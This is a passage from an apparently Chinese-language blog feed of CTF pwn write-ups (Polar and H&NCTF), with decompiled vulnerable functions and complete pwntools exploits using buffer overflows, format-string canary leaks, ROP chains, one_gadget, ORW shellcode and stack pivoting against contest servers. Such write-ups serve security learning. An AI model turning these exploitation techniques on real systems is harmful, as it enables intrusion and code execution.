class="number">48</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, try again.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;You can do it!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个gets可以写入任意大小的数据</p><p><img src="/../images/polar%E5%A4%8F%E5%AD%A3%E8%B5%9B/Snipaste_2025-06-09_17-08-34.png" alt="1"></p><p>从图中可以看出输入点在0x90处，canary在0xf8处</p><p>会进行5次检测分别为0x9a,0xa4,0xae,0xb8处的数据是否为’0’因为还没有到canary处所以直接全覆盖为’0’就好了注意是字符0其对应字节为<code>\x30</code></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;1.95.36.136&#x27;,2150)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;When do you do your pwn?&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x30&#x27;</span>*(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Now, you can pwn!!!&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;can do it!&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;can do it!&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;can do it!&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;can do it!&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="go"><a href="#go" class="headerlink" title="go"></a>go</h1><p>简单的PIE教学题</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>开始会给win函数的地址据此可得到lelf基地址</p><p>接着vuln函数里有栈溢出，有后门函数，直接打ret2text即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2109</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;csgo&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x960</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x94D</span> + elf_base</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>) + p64(gift)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input: &#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="bllhl-pieee"><a href="#bllhl-pieee" class="headerlink" title="bllhl_pieee"></a>bllhl_pieee</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>保护全开有格式化字符串漏洞有栈溢出可以用格式化字符串漏洞泄露canary，elf基地址，有system函数但是没有&#x2F;bin&#x2F;sh不用泄露libc也可以</p><p>和xy的girlfirend很像</p><p>漏洞函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">input</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-270h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">504</span>]; <span class="comment">// [rsp+70h] [rbp-200h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+268h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题有个很抽象的点，没给libc然后我本地环境和远程不一样所用到的偏移字符也不一样，不知道还有没有别的办法泄露elf基址目前还没想到</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2148</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&#x27;no\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;%83$p-%97$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;-0x&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0xc3d</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">system = base + <span class="number">0x868</span></span><br><span class="line">rdi_addr = base + <span class="number">0xc53</span></span><br><span class="line">gets = base + <span class="number">0x8a0</span></span><br><span class="line">buf_addr = base+<span class="number">0x202050</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x270</span>-<span class="number">0x8</span>)+p64(canary)+ p64(<span class="number">0</span>)+ p64(rdi_addr)+p64(buf_addr) +p64(gets)+p64(rdi_addr)+p64(buf_addr)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h1><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 (*v4)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  _QWORD buf[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">3</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  (init)(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s_);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s__0);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s__1);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s__2);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s__3);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;welcome to polar challenge&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You need an address.&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">0</span>] != <span class="number">0x208</span>LL )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;the gift for you: 0x%016lx\n&quot;</span>, *v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the address you want to go to.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you need to use&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;polar&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s_);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s__0);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s__1);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s__2);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s__3);</span><br><span class="line">  <span class="keyword">return</span> v4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知v4是一个int64的变量，可在第一处<code>__isoc99_scanf</code>存入<code>puts_got</code>利用后续的printf输出泄露libc基地址，buf[0]要保证为0x208</p><p>该处的printf可以输出一个64位无符号整数的十六进制表示</p><p>关键gadget</p><p><img src="/../images/polar%E5%A4%8F%E5%AD%A3%E8%B5%9B/Snipaste_2025-06-09_20-36-44.png" alt="1"></p><p>第二处<code>__isoc99_scanf</code>存入v4的地址可在最后被调用且我们之前得到了libc基地址</p><p>给了libc发现有个可利用的one_gadget</p><p><img src="/../images/polar%E5%A4%8F%E5%AD%A3%E8%B5%9B/Snipaste_2025-06-09_20-42-09.png" alt="1"></p><p>刚好在调用前将rax清零了所以选择第一个one_gadget</p><p>这里有个需要注意的点因为是用<code>__isoc99_scanf</code>获取输入目标程序期望接收一个字符串形式的地址，用sendline传数据，sendline要保证传送的数据为字符串所以要用str()包裹</p><p>用p64包裹的话则会成为字节流，导致指针无法识别正确地址和覆盖返回地址时有区别</p><p>最后我们传one_gadget地址时也是一样的原因，要传入一个字符串形式的地址而不是字节流</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(2)</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;1.95.36.136&#x27;,2079)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;You need an address.&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(puts_got))</span><br><span class="line">io.sendline(p64(<span class="number">520</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.2&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = libc_base+one_gadget[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">str</span>(one)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;you need to use&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ok到这里就浮现完所有栈的题了，这次忙着去打HN了但是今天一天就浮现完polar了效率还是拉满了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTFwp</title>
      <link href="/2025/06/07/H&amp;NCTFwp/"/>
      <url>/2025/06/07/H&amp;NCTFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="三步走战略"><a href="#三步走战略" class="headerlink" title="三步走战略"></a>三步走战略</h2><p>简单的orw</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec orw</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/orw&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br></pre></td></tr></table></figure><p>mmap分配了一个可读写执行的段buf，用第一个read读shellcode到buf上第二个read栈溢出执行buf上的shellcode读出flag，要注意一开始用getchar接收了一个字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;27.25.151.198&#x27;</span>,<span class="number">35086</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./orw&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;in advance.&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please speak:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0                </span></span><br><span class="line"><span class="string">mov r15, 0x67616c66  </span></span><br><span class="line"><span class="string">push r15</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rax, 2    </span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#调用read</span></span><br><span class="line">shellcode += <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov r14, 3</span></span><br><span class="line"><span class="string">mov rdi, r14</span></span><br><span class="line"><span class="string">mov rsi, 0x4040C8</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"><span class="comment">#调用write</span></span><br><span class="line">shellcode +=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x4040C8</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x30</span>+shellcode </span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Do you have anything else to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + p64(<span class="number">0x1337030</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Stack-Pivoting"><a href="#Stack-Pivoting" class="headerlink" title="Stack Pivoting"></a>Stack Pivoting</h2><p>【栈迁移】</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x3ff000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>给了libc有简单的栈溢出漏洞但是溢出字节数较少尝试栈迁移</p><p><img src="/../images/H&NCTF/Snipaste_2025-06-07_16-11-21.png" alt="1"></p><p>可以发现func中的read的rsi&#x3D;rbp+buf（buf为-0x40）所以我们可以通过控制rbp进而控制read的rsi，结合leave控制rsp</p><p>第一段payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;z&#x27;</span>*<span class="number">0x40</span> + p64(bss+<span class="number">0x40</span>)+p64(<span class="number">0x4011B7</span>)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>将read的rsi迁移到bss处并读入第二段payload</p><p>第二段payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = (p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(pop_rbp)+p64(bss+<span class="number">0x200</span>+<span class="number">0x40</span>)+p64(<span class="number">0x4011B7</span>)).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="number">8</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure><p>在bss上布置puts泄露libc基址，将rbp设为bss+200+0x40用于读入第三段提权shell，之后迁移到bss段开头执行</p><p>第三段payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rbp = <span class="number">0x404100</span></span><br><span class="line">payload =(p64(rbp)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(one_gadget)).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss+<span class="number">0x200</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure><p>因为rdx为50想要同时控制rdx和rsi为零比较费字节数刚好发现有好用的gadget，但是需要注意rbp-0x78处是可写的</p><p><img src="/../images/H&NCTF/Snipaste_2025-06-07_16-20-07.png" alt="1"></p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = 